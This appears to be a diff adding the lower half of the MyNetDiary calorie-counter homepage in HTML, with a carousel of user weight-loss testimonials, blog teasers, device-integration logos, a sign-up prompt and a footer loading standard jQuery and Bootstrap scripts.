+                    <li data-target="#carouselSuccessStory" data-slide-to="3"></li>
+                    <li data-target="#carouselSuccessStory" data-slide-to="4"></li>
+                    <li data-target="#carouselSuccessStory" data-slide-to="5"></li>
+                </ol>
+                <div class="carousel-inner">
+                    <div class="carousel-item active">
+                        <div class="__wrapper">
+                            <div class="_img">
+                                <figure>
+                                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/success-story-julie@1x.png" class="img-fluid" alt="Julie Marte success story: lost 71lb with MyNetDiary app">
+                                </figure>
+                            </div>
+                            <div class="_text">
+                                <h2 class="__heading">Julie Marte</h2>
+                                <p class="text-uppercase">Lost 71 lb (35%) and maintained<br> after 492 days.</p>
+                                <blockquote>
+                                    “My life changed.<br> My life is beautiful!<br> I am beautiful!!!”
+                                </blockquote>
+                                <a href="https://www.mynetdiary.com/success.do?personUserId=2060207" class="btn btn-tertiary btn-arrow btn-lg" role="button">Read Success Story</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="carousel-item">
+                        <div class="__wrapper">
+                            <div class="_img">
+                                <figure>
+                                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/success-story-carrie@1x.png" class="lazyload img-fluid" alt="Carrie Hammond success story: lost 103lb with MyNetDiary app">
+                                </figure>
+                            </div>
+                            <div class="_text">
+                                <h2 class="__heading">Carrie Hammond</h2>
+                                <p class="text-uppercase">lost and maintained 103 lbs (40%)<br> after 616 days.</p>
+                                <blockquote>
+                                    “I love having a desire to go out and experience new things without worrying about if I'm too fat to do something.”
+                                </blockquote>
+                                <a href="https://www.mynetdiary.com/success.do?personUserId=1624206" class="btn btn-tertiary btn-arrow btn-lg" role="button">Read Success Story</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="carousel-item">
+                        <div class="__wrapper">
+                            <div class="_img">
+                                <figure>
+                                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/success-paul-reynolds@1x.png" class="lazyload img-fluid" alt="Paul Reynolds success story: lost 50lb with MyNetDiary app">
+                                </figure>
+                            </div>
+                            <div class="_text">
+                                <h2 class="__heading">Paul Reynolds</h2>
+                                <p class="text-uppercase">Lost 50lb (22%) and maintained<br> after 345 days.</p>
+                                <blockquote>
+                                    “The ability to track using MyNetDiary has been so important.”
+                                </blockquote>
+                                <a href="https://www.mynetdiary.com/success.do?personUserId=2526554" class="btn btn-tertiary btn-arrow btn-lg" role="button">Read Success Story</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="carousel-item">
+                        <div class="__wrapper">
+                            <div class="_img">
+                                <figure>
+                                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/success-story-joe@1x.png" class="lazyload img-fluid" alt="Joe Balfe success story: lost 65lb with MyNetDiary app">
+                                </figure>
+                            </div>
+                            <div class="_text">
+                                <h2 class="__heading">Joe Balfe</h2>
+                                <p class="text-uppercase">Lost 65lb (20%) and maintained<br> after 216 days.</p>
+                                <blockquote>
+                                    “MyNetDiary helps me know exactly how many calories I consume.”
+                                </blockquote>
+                                <a href="https://www.mynetdiary.com/success.do?personUserId=2445291" class="btn btn-tertiary btn-arrow btn-lg" role="button">Read Success Story</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="carousel-item">
+                        <div class="__wrapper">
+                            <div class="_img">
+                                <figure>
+                                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/success-rick-white@1x.png" class="lazyload img-fluid" alt="Rick White success story: lost 91lb with MyNetDiary app">
+                                </figure>
+                            </div>
+                            <div class="_text">
+                                <h2 class="__heading">Rick White</h2>
+                                <p class="text-uppercase">Lost 91 lb (30%) and maintained<br> after 881 days.</p>
+                                <blockquote>
+                                    “I went body surfing for 4 hours straight with my 28 year old son and felt great!”
+                                </blockquote>
+                                <a href="https://www.mynetdiary.com/success.do?personUserId=718567" class="btn btn-tertiary btn-arrow btn-lg" role="button">Read Success Story</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="carousel-item">
+                        <div class="__wrapper">
+                            <div class="_img">
+                                <figure>
+                                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/success-matthew-warner@1x.png" class="lazyload img-fluid" alt="Matthew Warner lost 29lb with MyNetDiary app">
+                                </figure>
+                            </div>
+                            <div class="_text">
+                                <h2 class="__heading">Matthew Warner</h2>
+                                <p class="text-uppercase">Lost 29lb (14%) and maintained<br> after 379 days.</p>
+                                <blockquote>
+                                    “I used your product religiously for two years and it made a huge difference in my health and happiness.”
+                                </blockquote>
+                                <a href="https://www.mynetdiary.com/success.do?personUserId=541692" class="btn btn-tertiary btn-arrow btn-lg" role="button">Read Success Story</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <a class="carousel-control-prev" href="#carouselSuccessStory" role="button" data-slide="prev">
+                    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                    <span class="sr-only">Previous</span>
+                </a>
+                <a class="carousel-control-next" href="#carouselSuccessStory" role="button" data-slide="next">
+                    <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                    <span class="sr-only">Next</span>
+                </a>
+            </div>
+        </div>
+        </div>
+    </section>
+    <section class="section-digest">
+        <h3 class="_headline">Being Healthy<br class="d-block d-xl-none"> Has Never Been Easier</h3>
+        <div class="container">
+            <div class="_lead">
+                <a href="https://www.mynetdiary.com/3-expert-tips-on-handing-out-healthier-trick-or-treats.html">
+                    <img class="lazyload img-fluid w-100" data-src="https://s3.amazonaws.com/img.mynetdiary.com/blog/expert-tips-on-handing-out-healthier-alternatives-to-trick-or-treaters.jpeg" alt="3 expert tips on handing out healthier trick-or-treats">
+                </a>
+                <h3 class="__heading"><a href="https://www.mynetdiary.com/3-expert-tips-on-handing-out-healthier-trick-or-treats.html">3 expert tips on handing out healthier trick-or-treats</a></h3>
+                <p>Looking for a healthy Halloween treat to hand out to trick-or-treaters?  Here are some creative candy alternatives that can benefit the whole family.  Help your kids (and yourself) cut ba...</p>
+                <a href="https://www.mynetdiary.com/3-expert-tips-on-handing-out-healthier-trick-or-treats.html" class="text-info">Read more</a>
+            </div>
+            <div class="_blog">
+
+                <div class="media">
+                    <a href="https://www.mynetdiary.com/how-these-mynetdiary-users-achieved-their-weight-loss-success-what-we-can-learn-from-them.html" class="media-left">
+                        <img data-src="https://www.mynetdiary.com/autothumb?width=580&amp;url=//s3.amazonaws.com/img.mynetdiary.com/blog/how-these-mynetdiary-users-achieved-their-weight-loss-success.jpeg"
+                            class="lazyload img-fluid" alt="...">
+                    </a>
+                    <div class="media-body">
+                        <h6 class="__heading"><a href="https://www.mynetdiary.com/how-these-mynetdiary-users-achieved-their-weight-loss-success-what-we-can-learn-from-them.html">How these MyNetDiary users achieved their weight loss success & what we can learn from them</a></h6>
+                        <p>Want to know how other MyNetDiary users achieved their weight loss success?  Learn some helpful tips and tricks for l...</p>
+                        <a href="https://www.mynetdiary.com/how-these-mynetdiary-users-achieved-their-weight-loss-success-what-we-can-learn-from-them.html" class="text-info">Read more</a>
+                    </div>
+                </div>
+                
+                <div class="media">
+                    <a href="https://www.mynetdiary.com/healthier-bread-on-a-budget-we-are-creatures-of.html" class="media-left">
+                        <img data-src="https://www.mynetdiary.com/autothumb?width=580&amp;url=//s3.amazonaws.com/img.mynetdiary.com/blog/healthier-bread-on-a-budget.jpeg"
+                            class="lazyload img-fluid" alt="...">
+                    </a>
+                    <div class="media-body">
+                        <h6 class="__heading"><a href="https://www.mynetdiary.com/healthier-bread-on-a-budget-we-are-creatures-of.html">Love your bread & don't want to give it up? Here's how to have healthier bread on a budget</a></h6>
+                        <p>Do you buy bread or make your own?  Whether your bread is homemade or store bought, here's how to have healthier brea...</p>
+                        <a href="https://www.mynetdiary.com/healthier-bread-on-a-budget-we-are-creatures-of.html" class="text-info">Read more</a>
+                    </div>
+                </div>
+                
+                <div class="media">
+                    <a href="https://www.mynetdiary.com/healthy-dairy-free-zucchini-brownies.html" class="media-left">
+                        <img data-src="https://www.mynetdiary.com/autothumb?width=580&amp;url=//s3.amazonaws.com/img.mynetdiary.com/blog/healthy-dairy-free-zucchini-brownies.jpg"
+                            class="lazyload img-fluid" alt="...">
+                    </a>
+                    <div class="media-body">
+                        <h6 class="__heading"><a href="https://www.mynetdiary.com/healthy-dairy-free-zucchini-brownies.html">Healthy Dairy-free Zucchini Brownies</a></h6>
+                        <p>Do you love brownies and are you always on the lookout for creative ways to get in your veggies? Check out this recip...</p>
+                        <a href="https://www.mynetdiary.com/healthy-dairy-free-zucchini-brownies.html" class="text-info">Read more</a>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        <div class="text-center">
+            <a href="https://www.mynetdiary.com/blog.html" class="btn btn-tertiary btn-arrow btn-lg" role="button">View All Articles</a>
+        </div>
+    </section>
+    <section class="section-compatible">
+        <div class="container">
+            <h3 class="_headline">Connect Apps & Devices</h3>
+            <ul class="_logos">
+                <li><img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-garmin.png" data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-garmin@2x.png 2x" alt="Garmin" class="lazyload img-fluid"></li>
+                <li><img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-app-health.png" data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-app-health@2x.png 2x" alt="App Health" class="lazyload img-fluid"></li>
+                <li><img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-samsung-health.png" data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-samsung-health@2x.png 2x" alt="Samsung Health" class="lazyload img-fluid"></li>
+                <li><img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-apple-watch.png" data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-apple-watch@2x.png 2x" alt="Apple Watch" class="lazyload img-fluid"></li>
+                <li><img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-fitbit.png" data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-fitbit@2x.png 2x" alt="Fitbit" class="lazyload img-fluid"></li>
+                <li><img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-withings.png" data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-withings@2x.png 2x" alt="Withings" class="lazyload img-fluid"></li>
+                <li><img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-google-fit.png" data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-google-fit@2x.png 2x" alt="Google Fit" class="lazyload img-fluid"></li>
+            </ul>
+        </div>
+    </section>
+    <section class="section-cta">
+        <div class="_wrapper">
+            <div class="__layers">
+                <div class="container">
+                    <h2 class="_headline">Start Your Free<br> Food Diary Today</h2>
+                    <a href="https://www.mynetdiary.com/signupPage.do" class="btn btn-secondary btn-max btn-shadow" role="button">Sign up</a>
+                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-your-free--devices@1x.png"
+                        data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-your-free--devices@2x.png 1760w,
+                                https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-your-free--devices@1x.png 880w,
+                                https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-your-free--devices@0,5x.png 440w"
+                        sizes="(min-width: 2000px) 1760px,
+                                (min-width: 576px) 880px,
+                                440px"
+                        alt="MyNetDiary calorie counter app available for iPhone, iPad and Android" class="lazyload __layer-devices img-fluid">
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer class="footer-site __rounded">
+        <div class="container">
+            <div class="_section">
+                <a href="#" class="_logo">
+                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-dark.svg" alt="MyNetDiary" width="300" class="img-fluid w-100">
+                </a>
+                <div class="_stores">
+                    <a href="https://apps.apple.com/us/app/calorie-counter-mynetdiary/id287529757?pt=10328&amp;ct=index_page" class="__item" role="button"><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/app-store-badge.svg" alt="App Store" width="144" class="img-fluid w-100"></a>
+                    <a href="https://play.google.com/store/apps/details?id=com.fourtechnologies.mynetdiary.ad&amp;referrer=utm_source%3Dindex_page%26utm_campaign%3Dindex_page_link" class="__item" role="button"><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/google-play-badge.svg" alt="Google Play" width="144" class="img-fluid w-100"></a>
+                </div>
+                <div class="_stats">
+                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="24" alt="Star">
+                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="24" alt="Star">
+                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="24" alt="Star">
+                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="24" alt="Star">
+                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-4.7.png" width="24" alt="Star">
+                    <strong>4.7</strong>
+                    <span>&bull;</span>
+                    3.9K Ratings
+                </div>
+                <ul class="list-share">
+                    <li>
+                        <a href="https://www.instagram.com/mynetdiary/" class="__instagram">
+                            <span class="___icon"></span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.facebook.com/mynetdiary/" class="__facebook">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="15px" height="27px">
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M15.004,4.684 L10.719,4.684 C10.212,4.684 9.646,5.351 9.646,6.242 L9.646,9.336 L15.004,9.336 L15.004,13.745 L9.646,13.745 L9.646,26.987 L4.588,26.987 L4.588,13.745 L0.002,13.745 L0.002,9.336 L4.588,9.336 L4.588,6.741 C4.588,3.019 7.172,-0.009 10.719,-0.009 L15.004,-0.009 L15.004,4.684 Z"/>
+                            </svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://twitter.com/mynetdiary/" class="__twitter">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="30px" height="24px">
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M30.001,2.843 C28.910,3.316 27.723,3.640 26.470,3.803 C27.755,3.039 28.731,1.867 29.188,0.434 C28.000,1.135 26.666,1.639 25.267,1.915 C24.158,0.727 22.549,-0.005 20.758,-0.005 C17.374,-0.005 14.607,2.713 14.607,6.049 C14.607,6.537 14.689,6.994 14.786,7.433 C9.660,7.188 5.120,4.779 2.093,1.101 C1.572,2.013 1.247,3.039 1.247,4.145 C1.247,6.261 2.354,8.115 3.981,9.190 C2.972,9.174 2.028,8.897 1.198,8.441 C1.198,8.474 1.198,8.490 1.198,8.523 C1.198,9.304 1.345,10.021 1.621,10.704 C2.370,12.609 4.079,14.040 6.146,14.447 C5.608,14.594 5.088,14.675 4.518,14.675 C4.128,14.675 3.737,14.626 3.362,14.545 C4.160,16.954 6.422,18.711 9.108,18.776 C6.991,20.404 4.355,21.364 1.475,21.364 C0.970,21.364 0.499,21.331 -0.005,21.282 C2.728,22.992 5.966,24.001 9.433,24.001 C19.050,24.001 24.990,17.344 26.535,10.427 C26.812,9.190 26.942,7.970 26.942,6.765 C26.942,6.505 26.942,6.229 26.942,5.983 C28.130,5.122 29.188,4.047 30.001,2.843 L30.001,2.843 Z"/>
+                            </svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.youtube.com/user/MyNetDiary/" class="__youtube">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="37px" height="42px" viewBox="0 0 1000 1000">
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M891,516.4c-4.7-21.5-15.2-39.6-31.4-54.1c-16.2-14.6-34.9-23.1-56.1-25.7c-67.1-7.3-168.2-10.9-303.5-10.9c-135.3,0-236.3,3.6-303,10.9c-21.5,2.6-40.3,11.1-56.3,25.7c-16,14.6-26.6,32.6-31.7,54.1c-9.5,42.3-14.2,106.1-14.2,191.4c0,86.8,4.7,150.6,14.2,191.4c4.7,21.5,15.2,39.6,31.5,54.1c16.2,14.6,34.9,23,56.1,25.2C263.6,986.2,364.7,990,500,990c135.2,0,236.4-3.8,303.5-11.5c21.2-2.2,39.7-10.6,55.8-25.2c16-14.6,26.6-32.6,31.7-54.1c9.5-42.3,14.2-106.1,14.2-191.4C905.2,621,900.5,557.2,891,516.4z M326.1,571.6h-58.5v311.2h-54.7V571.6h-57.4v-51.4h170.6L326.1,571.6L326.1,571.6z M473.8,882.8h-48.7v-29.5c-19.7,22.2-38.3,33.4-55.8,33.4c-16.8,0-27.3-6.8-31.7-20.2c-2.9-8.7-4.4-22.1-4.4-39.9V612.7h48.7v199.1c0,11.7,0.2,18,0.6,19.1c1.1,7.7,4.9,11.5,11.5,11.5c9.8,0,20.2-7.7,31.2-23V612.7h48.7L473.8,882.8L473.8,882.8z M659.7,801.9c0,26.6-1.6,44.9-4.9,54.7c-6.2,20-19.1,30.1-38.8,30.1c-17.5,0-34.4-10-50.9-30.1v26.2h-48.7V520.2h48.7v118.7c15.7-19.7,32.6-29.5,50.9-29.5c19.7,0,32.6,10.2,38.8,30.6c3.3,9.5,4.9,27.5,4.9,54.1V801.9z M844.5,757h-97.9v47.6c0,25.2,8.4,37.7,25.2,37.7c12,0,19.3-6.6,21.9-19.7c0.7-3.6,1.1-14.8,1.1-33.4h49.8v7.1c0,17.9-0.4,28.4-1.1,31.7c-1.1,9.8-4.9,19.7-11.5,29.5c-13.1,19.3-32.8,29-59.1,29c-25.1,0-44.8-9.3-59.1-27.9c-10.6-13.5-15.9-34.6-15.9-63.4v-94.6c0-28.8,5.1-49.9,15.3-63.4c14.2-18.6,33.7-27.9,58.5-27.9c24.4,0,43.8,9.3,58,27.9c9.9,13.5,14.8,34.6,14.8,63.4V757L844.5,757z"/>
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M589.7,653.7c-8.4,0-16.6,4-24.6,12v164.6c8,8,16.2,12,24.6,12c14.2,0,21.3-12.2,21.3-36.6V690.3C611,665.9,603.9,653.7,589.7,653.7z"/>
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M771.3,653.7c-16.4,0-24.6,12.4-24.6,37.2V716h49.2v-25.2C795.9,666.1,787.7,653.7,771.3,653.7z"/>
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M294.4,228.2v148.2h54.7V228.2L415.2,10h-55.8l-37.2,143.8L283.5,10h-58c10.2,30.6,22.1,64.7,35.5,102.3C278.2,162.6,289.3,201.2,294.4,228.2z"/>
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M488.5,380.2c25.2,0,44.5-9.3,58-27.9c10.2-13.5,15.3-35,15.3-64.5v-95.7c0-29.2-5.1-50.5-15.3-64c-13.5-18.6-32.8-27.9-58-27.9c-24.4,0-43.6,9.3-57.4,27.9c-10.2,13.5-15.3,34.8-15.3,64v95.7c0,29.2,5.1,50.7,15.3,64.5C445,370.9,464.1,380.2,488.5,380.2z M465,182.3c0-25.2,7.8-37.7,23.5-37.7s23.5,12.6,23.5,37.7v114.8c0,25.5-7.8,38.3-23.5,38.3S465,322.6,465,297.1V182.3z"/>
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M638.9,380.2c18.2,0,37-11.3,56.3-33.9v30.1H745V103.5h-49.8v208.4c-10.9,15.7-21.3,23.5-31.2,23.5c-6.6,0-10.4-4-11.5-12c-0.4-0.7-0.6-7.1-0.6-19.1V103.5h-49.8V319c0,18.6,1.5,32.3,4.4,41C611.4,373.5,622.1,380.2,638.9,380.2z"/>
+                            </svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.pinterest.com/mynetdiary/" class="__pinterest">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="32px">
+                                <path fill-rule="evenodd"  fill="rgb(207, 192, 190)" d="M10.271,21.153 C9.427,25.557 8.395,29.781 5.338,31.986 C4.396,25.329 6.724,20.329 7.805,15.020 C5.962,11.934 8.027,5.722 11.916,7.252 C16.700,9.136 7.772,18.728 13.765,19.927 C20.023,21.177 22.578,9.127 18.697,5.209 C13.091,-0.448 2.377,5.080 3.695,13.181 C4.016,15.162 6.073,15.762 4.517,18.495 C0.929,17.704 -0.143,14.890 -0.004,11.137 C0.218,4.994 5.545,0.694 10.887,0.099 C17.645,-0.653 23.987,2.566 24.862,8.889 C25.849,16.024 21.813,23.752 14.587,23.197 C12.629,23.045 11.806,22.081 10.271,21.153 Z"/>
+                            </svg>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div class="_section">
+                <h6 class="_heading">Library</h6>
+                <ul class="navbar-nav">
+                    <li><a href="https://www.mynetdiary.com/blog.html">Blog</a></li>
+                    <li><a href="https://www.mynetdiary.com/food-diary-and-calorie-counter-for-nutritionists.html">Nutrition Science</a></li>
+                </ul>
+            </div>
+            <div class="_section">
+                <h6 class="_heading">Community</h6>
+                <ul class="navbar-nav">
+                    <li><a href="https://www.mynetdiary.com/weight-loss-forum">Forums</a></li>
+                    <li><a href="https://www.mynetdiary.com/weight-loss-teams">Teams</a></li>
+                    <li><a href="https://www.mynetdiary.com/weight-loss-groups">Groups</a></li>
+                </ul>
+            </div>
+            <div class="_section">
+                <h6 class="_heading">Company</h6>
+                <ul class="navbar-nav">
+                    <li><a href="https://www.mynetdiary.com/find-a-health-professional.html">Professionals</a></li>
+                    <li><a href="https://www.mynetdiary.com/mynetdiary-for-business.html">Business</a></li>
+                    <li><a href="https://www.mynetdiary.com/about.html">About Us</a></li>
+                    <li><a href="https://www.mynetdiary.com/press-releases.html">Press</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            <div class="container">
+                <div class="_text">
+                    Copyright &copy; 2019 MyNetDiary Inc.<br class="d-block d-sm-none"> All rights reserved.
+                </div>
+                <ul class="nav">
+                    <li><a href="https://www.mynetdiary.com/contactUs.html">Contact Us</a></li>
+                    <li><a href="https://www.mynetdiary.com/help.html">FAQ</a></li>
+                    <li><a href="https://www.mynetdiary.com/privacy.html">Privacy</a></li>
+                    <li><a href="https://www.mynetdiary.com/terms.html">Terms of Use</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+    <!-- switched to cdn -->
+    <script   src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8="   crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
+    <script src="https://www.mynetdiary.com/js/dist/slideout.min.2019_rel23.63.js" type="text/javascript"></script>
+    <script src="https://www.mynetdiary.com/js/dist/mnd-slideout.2019_rel23.63.js" type="text/javascript"></script>
+</body>
+</html>
